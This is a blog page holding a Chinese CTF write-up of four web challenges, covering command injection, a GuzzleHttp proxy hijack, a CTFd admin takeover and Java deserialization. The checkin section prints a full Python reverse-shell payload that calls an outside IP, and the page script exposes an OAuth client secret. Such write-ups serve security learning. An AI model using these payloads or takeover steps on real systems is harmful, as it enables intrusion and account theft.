@@ -1,0 +1,457 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <meta name="description" content="osword&#39;s blog">
+  <meta name="keyword" content="hexo-theme, vuejs">
+  
+    <link rel="shortcut icon" href="/css/images/logo.png">
+  
+  <title>
+    
+      [CTF]V&amp;N内部考核WEB题解 | osword&#39;s blog
+    
+  </title>
+  <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/css/plugins/gitment.css">
+
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/geopattern/1.2.3/js/geopattern.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script>
+  
+  
+    
+<script src="/js/gitment.js"></script>
+
+  
+  
+  
+    <!-- MathJax support START -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <!-- MathJax support END -->
+  
+
+
+  
+<meta name="generator" content="Hexo 4.2.1"></head>
+<div class="wechat-share">
+  <img src="/css/images/logo.png" />
+</div>
+
+  <body>
+    <header class="header fixed-header">
+  <div class="header-container">
+    <a class="home-link" href="/">
+      <div class="logo"></div>
+      <span>osword's blog</span>
+    </a>
+    <ul class="right-list">
+      
+        <li class="list-item">
+          
+            <a href="/" class="item-link">Home</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/links/" class="item-link">Links</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/archives/" class="item-link">Archives</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/project/" class="item-link">Projects</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/about/" class="item-link">About</a>
+          
+        </li>
+      
+    </ul>
+    <div class="menu">
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+    </div>
+    <div class="menu-mask">
+      <ul class="menu-list">
+        
+          <li class="menu-item">
+            
+              <a href="/" class="menu-link">Home</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/links/" class="menu-link">Links</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/archives/" class="menu-link">Archives</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/project/" class="menu-link">Projects</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/about/" class="menu-link">About</a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</header>
+
+    <div id="article-banner">
+  <h2>[CTF]V&N内部考核WEB题解</h2>
+  <p class="post-date">2020-03-03 - 
+<span id="busuanzi_container_page_pv" style="color: #fff; margin-left: 0px">阅读量<span id="busuanzi_value_page_pv"></span>次
+        </span></p>
+<div class="arrow-down">
+    <a href="javascript:;"></a>
+  </div>
+</div>
+<main class="app-body flex-box">
+  <!-- Article START -->
+  <article class="post-article">
+    <section class="markdown-content"><h1 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">flag_file = open(<span class="string">"flag.txt"</span>, <span class="string">"r"</span>)</span><br><span class="line"><span class="comment"># flag = flag_file.read()</span></span><br><span class="line"><span class="comment"># flag_file.close()</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># @app.route('/flag')</span></span><br><span class="line"><span class="comment"># def flag():</span></span><br><span class="line"><span class="comment">#     return flag</span></span><br><span class="line"><span class="comment">## want flag? naive!</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># You will never find the thing you want:) I think</span></span><br><span class="line"><span class="meta">@app.route('/shell')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shell</span><span class="params">()</span>:</span></span><br><span class="line">    os.system(<span class="string">"rm -f flag.txt"</span>)</span><br><span class="line">    exec_cmd = request.args.get(<span class="string">'c'</span>)</span><br><span class="line">    os.system(exec_cmd)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"1"</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">source</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"app.py"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>)</span><br></pre></td></tr></table></figure>
+
+<p>命令执行操作，但是没有回显示，可以利用反弹shell。但是flag.txt文件已经被删除。</p>
+<p>思路：在linux系统中只要文件被打开,/proc/self/fd/n就会有缓存</p>
+<p>这里安利一篇文章：<a href="https://www.00theway.org/2020/01/17/java-god-s-eye/" target="_blank" rel="noopener">通杀漏洞利用回显方法-linux平台</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;be8c5a4b-9e00-4024-a486-4f0ff7e7571f.node3.buuoj.cn&#x2F;shell?c&#x3D;python3%20-c%20%27import%20socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22174.0.224.196%22,8899));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p&#x3D;subprocess.call([%22&#x2F;bin&#x2F;sh%22,%22-i%22]);%27</span><br></pre></td></tr></table></figure>
+
+<p><img src="./image-20200302213906715.png" alt="image-20200302213906715"></p>
+<h1 id="TimeTravle"><a href="#TimeTravle" class="headerlink" title="TimeTravle"></a>TimeTravle</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">'/vendor/autoload.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">GuzzleHttp</span>\<span class="title">Client</span>;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>])) &#123;</span><br><span class="line">    $client = <span class="keyword">new</span> Client();</span><br><span class="line">    $response = $client-&gt;get(<span class="string">'http://127.0.0.1:5000/api/eligible'</span>);</span><br><span class="line">    $content = $response-&gt;getBody();</span><br><span class="line">    $data = json_decode($content, <span class="keyword">TRUE</span>);</span><br><span class="line">    <span class="keyword">if</span>($data[<span class="string">'success'</span>] === <span class="keyword">true</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> system(<span class="string">'/readflag'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>])) &#123;</span><br><span class="line">    highlight_file($_GET[<span class="string">'file'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'phpinfo'</span>])) &#123;</span><br><span class="line">    phpinfo();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>简单审计：有文件读取操作和phpinfo信息泄露操作，但是拿到flag需要访问api，</p>
+<p>读取本地docker文件</p>
+<p><code>/start.sh</code></p>
+<p>nginx+php且phpinfo显示利用cgi通信</p>
+<p><img src="./image-20200302215620065.png" alt="image-20200302215620065"></p>
+<p>读取/src/app.py,运行该api需要在2050年才能返回true.</p>
+<p><img src="./image-20200302215757406.png" alt="image-20200302215757406"></p>
+<p>竟然程序无法通过app.py获得true，还有思路是利用ssrf或者CRLF注入去访问该内网地址，该思路明显不行，执行访问操作已经嵌入在php代码中.</p>
+<p>只能利用组件漏洞，劫持<code>http://127.0.0.1:5000/api/eligible</code>该地址，使之不走app.py通信.走你设置的服务器，访问后回显的json格式带{“sucess”:True}</p>
+<p>这里的环境变量再被程序里的 GuzzleHttp 使用</p>
+<p>链接：<a href="https://www.laruence.com/2016/07/19/3101.html" target="_blank" rel="noopener">https://www.laruence.com/2016/07/19/3101.html</a></p>
+<p><img src="./image-20200302220435844.png" alt="image-20200302220435844"></p>
+<p>Linux Labs起个服务,写index.php</p>
+<p><img src="./image-20200302221347567.png" alt="image-20200302221347567"></p>
+<h1 id="HappyCTFd"><a href="#HappyCTFd" class="headerlink" title="HappyCTFd"></a>HappyCTFd</h1><p>该题利用CTFd 1day漏洞</p>
+<p><a href="https://www.colabug.com/2020/0204/6940556/" target="_blank" rel="noopener">https://www.colabug.com/2020/0204/6940556/</a></p>
+<p><a href="https://github.com/CTFd/CTFd/commit/f660ed1fb769126a2d149c26645bbde457a5c616" target="_blank" rel="noopener">https://github.com/CTFd/CTFd/commit/f660ed1fb769126a2d149c26645bbde457a5c616</a></p>
+<p>账号注册逻辑中，接收用户名后验证身份，账户不存在则进行一次数据库写入操作。但是在写入数据库操作时，进行了一次<code>strip()</code>操作,所以创建用户时候添加空格就能够创建与数据库中相同的用户名.</p>
+<p><img src="./image-20200302233144382.png" alt="image-20200302233144382"></p>
+<p>但是这样仍然接管不了真正的admin账户.需要利用到重置密码漏洞</p>
+<p>forgot_password方法中传入的team值通过email取出，为上一步恶意注册用户结果</p>
+<p><img src="./image-20200302235439643.png" alt="image-20200302235439643"></p>
+<p>跟进forgot_password方法,将用户名序列化token拼接到无用字符串中，发送到攻击者邮箱中.</p>
+<p><img src="./image-20200302235649190.png" alt="image-20200302235649190"></p>
+<p>之后攻击者访问邮箱收到的url地址，进入到token验证逻辑中.而后就能够直接修改admin账户密码</p>
+<p><img src="./image-20200303000548502.png" alt="image-20200303000548502"></p>
+<p><img src="./image-20200303000456072.png" alt="image-20200303000456072"></p>
+<ol>
+<li>注册<em>空格+admin</em></li>
+<li>向你的邮箱中发送重置密码请求</li>
+</ol>
+<p><img src="./image-20200303000737168.png" alt="image-20200303000737168"></p>
+<ol start="3">
+<li><p>打开<a href="http://9dd29132-adae-4782-9d00-deb092c278e9.node3.buuoj.cn/reset_password/ImFkbWluIg.Xl0qiA.GH7ren_SCFIaBZ43c3dDarzH6oU" target="_blank" rel="noopener">http://9dd29132-adae-4782-9d00-deb092c278e9.node3.buuoj.cn/reset_password/ImFkbWluIg.Xl0qiA.GH7ren_SCFIaBZ43c3dDarzH6oU</a></p>
+<p><img src="./image-20200303000750485.png" alt="image-20200303000750485"></p>
+</li>
+<li><p>修改密码后，访问settings成功得到admin管理账户</p>
+</li>
+</ol>
+<p><img src="./image-20200303000849274.png" alt="image-20200303000849274"></p>
+<p>Backup =&gt; Export 获取flag</p>
+<p><img src="./image-20200303001021836.png" alt="image-20200303001021836"></p>
+<h1 id="EasySpringMVC"><a href="#EasySpringMVC" class="headerlink" title="EasySpringMVC"></a>EasySpringMVC</h1><p>java两种命令执行构造</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">new processBuilder(cmd).start()</span><br><span class="line">Runtime.getRuntime().exec(cmd)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>jd-Gui打开war包</p>
+<p>ClentinfoFilter能过对cookie反序列化,触发点为Tools.parse方法</p>
+<p><img src="./image-20200303010252582.png" alt="image-20200303010252582"></p>
+<p>在Tools类中，复写的readObject中调用ProcessBuilder能够触发命令执行.当readObject被定义为私有属性，在反序列化时候将被优先调用.</p>
+<p>现在就是如何构造obj参数的问题，可以利用testCall可控作为传入参数.定义个settestCall方法.</p>
+<p><a href="https://blog.csdn.net/Leon_cx/article/details/81517603" target="_blank" rel="noopener">https://blog.csdn.net/Leon_cx/article/details/81517603</a></p>
+<p><img src="./image-20200303015041644.png" alt="image-20200303015041644"></p>
+<p>设置cookie即可获得shell。这里还有一种方法是重写writeObject也能达到目的.</p>
+<p><img src="./image-20200303020306698.png" alt="image-20200303020306698"></p>
+<p><img src="./image-20200303020244882.png" alt="image-20200303020244882"></p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://cjm00n.top/2020/02/29/V-N公开赛2020-writeup/?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">https://cjm00n.top/2020/02/29/V-N%E5%85%AC%E5%BC%80%E8%B5%9B2020-writeup/?tdsourcetag=s_pctim_aiomsg</a></p>
+<p><a href="https://www.zhaoj.in/read-6407.html?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">https://www.zhaoj.in/read-6407.html?tdsourcetag=s_pctim_aiomsg</a></p>
+<p><a href="https://glotozz.github.io/2020/03/02/V-N2020公开赛wp/#easyspringmvc" target="_blank" rel="noopener">https://glotozz.github.io/2020/03/02/V-N2020%E5%85%AC%E5%BC%80%E8%B5%9Bwp/#easyspringmvc</a></p>
+</section>
+    <!-- Tags START -->
+    
+      <div class="tags">
+        <span>Tags:</span>
+        
+  <a href="/tags#CTF" >
+    <span class="tag-code">CTF</span>
+  </a>
+
+      </div>
+    
+    <!-- Tags END -->
+    <!-- NAV START -->
+    
+  <div class="nav-container">
+    <!-- reverse left and right to put prev and next in a more logic postition -->
+    
+      <a class="nav-left" href="/2020/02/26/Tomcat-Ajp%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8-CVE-2020-1938/">
+        <span class="nav-arrow">← </span>
+        
+          Tomcat-Ajp协议漏洞分析利用(CVE-2020-1938)
+        
+      </a>
+    
+    
+      <a class="nav-right" href="/2020/03/16/CVE-2020-5405-spring-cloud-config-server-%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+        
+          [CVE-2020-5405] spring-cloud-config-server 路径穿越漏洞复现
+        
+        <span class="nav-arrow"> →</span>
+      </a>
+    
+  </div>
+
+    <!-- NAV END -->
+    <!-- 打赏 START -->
+    
+      <div class="money-like">
+        <div class="reward-btn">
+          赏
+          <span class="money-code">
+            <span class="alipay-code">
+              <div class="code-image"></div>
+              <b>使用支付宝打赏</b>
+            </span>
+            <span class="wechat-code">
+              <div class="code-image"></div>
+              <b>使用微信打赏</b>
+            </span>
+          </span>
+        </div>
+        <p class="notice">若你觉得我的文章对你有帮助，欢迎点击上方按钮对我打赏</p>
+      </div>
+    
+    <!-- 打赏 END -->
+    <!-- 二维码 START -->
+    
+    <!-- 二维码 END -->
+    
+      <!-- Gitment START -->
+      <div id="comments"></div>
+      <!-- Gitment END -->
+    
+  </article>
+  <!-- Article END -->
+  <!-- Catalog START -->
+  
+    <aside class="catalog-container">
+  <div class="toc-main">
+    <strong class="toc-title">Catalog</strong>
+    
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#checkin"><span class="toc-nav-text">checkin</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#TimeTravle"><span class="toc-nav-text">TimeTravle</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#HappyCTFd"><span class="toc-nav-text">HappyCTFd</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#EasySpringMVC"><span class="toc-nav-text">EasySpringMVC</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#参考链接"><span class="toc-nav-text">参考链接</span></a></li></ol>
+    
+  </div>
+</aside>
+  
+  <!-- Catalog END -->
+</main>
+
+<script>
+  (function () {
+    var url = 'http://zhzhdoai.github.io/2020/03/03/CTF-V-N内部考核WEB题解/';
+    var banner = ''
+    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
+      $('#article-banner').css({
+        'background-image': 'url(' + banner + ')'
+      })
+    } else {
+      $('#article-banner').geopattern(url)
+    }
+    $('.header').removeClass('fixed-header')
+
+    // error image
+    $(".markdown-content img").on('error', function() {
+      $(this).attr('src', 'http://file.muyutech.com/error-img.png')
+      $(this).css({
+        'cursor': 'default'
+      })
+    })
+
+    // zoom image
+    $(".markdown-content img").on('click', function() {
+      var src = $(this).attr('src')
+      if (src !== 'http://file.muyutech.com/error-img.png') {
+        var imageW = $(this).width()
+        var imageH = $(this).height()
+
+        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
+        zoom = zoom < 1 ? 1 : zoom
+        zoom = zoom > 2 ? 2 : zoom
+        var transY = (($(window).height() - imageH) / 2).toFixed(2)
+
+        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
+        $('.image-view-wrap').addClass('wrap-active')
+        $('.image-view-wrap img').css({
+          'width': `${imageW}`,
+          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
+        })
+        $('html').css('overflow', 'hidden')
+
+        $('.image-view-wrap').on('click', function() {
+          $(this).remove()
+          $('html').attr('style', '')
+        })
+      }
+    })
+  })();
+</script>
+
+
+
+
+  <script>
+    var gitmentConfig = "osword";
+    if (gitmentConfig !== 'undefined') {
+      var gitment = new Gitment({
+        id: "[CTF]V&N内部考核WEB题解",
+        owner: "osword",
+        repo: "osword.github.io",
+        oauth: {
+          client_id: "7d7576c71632f14d639a",
+          client_secret: "3d7f7e4c0e9a43a2cc5334d68aee612090df8b70"
+        },
+        theme: {
+          render(state, instance) {
+            const container = document.createElement('div')
+            container.lang = "en-US"
+            container.className = 'gitment-container gitment-root-container'
+            container.appendChild(instance.renderHeader(state, instance))
+            container.appendChild(instance.renderEditor(state, instance))
+            container.appendChild(instance.renderComments(state, instance))
+            container.appendChild(instance.renderFooter(state, instance))
+            return container;
+          }
+        }
+      })
+      gitment.render(document.getElementById('comments'))
+    }
+  </script>
+
+
+
+
+    <div class="scroll-top">
+  <span class="arrow-icon"></span>
+</div>
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<footer class="app-footer">
+  <p class="copyright">
+    &copy; 2020 | Proudly powered by <a href="https://hexo.io" target="_blank">Hexo</a>
+    <br>
+    Theme by <a href="https://github.com/yanm1ng" target="_blank" rel="noopener">yanm1ng</a>
+  </p>
+    访问量<span id="busuanzi_value_site_pv"></span>,
+    访客数<span id="busuanzi_value_site_uv"></span>
+</footer>
+
+<script>
+  function async(u, c) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+</script>
+<script>
+  async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
+    FastClick.attach(document.body);
+  })
+</script>
+
+<script>
+  var hasLine = 'true';
+  async("//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js", function(){
+    $('figure pre').each(function(i, block) {
+      var figure = $(this).parents('figure');
+      if (hasLine === 'false') {
+        figure.find('.gutter').hide();
+      }
+      var lang = figure.attr('class').split(' ')[1] || 'code';
+      var codeHtml = $(this).html();
+      var codeTag = document.createElement('code');
+      codeTag.className = lang;
+      codeTag.innerHTML = codeHtml;
+      $(this).attr('class', '').empty().html(codeTag);
+      figure.attr('data-lang', lang.toUpperCase());
+      hljs.highlightBlock(block);
+    });
+  })
+</script>
+<!-- Baidu Tongji -->
+
+
+<script src="/js/script.js"></script>
+
+
+  </body>
+</html>
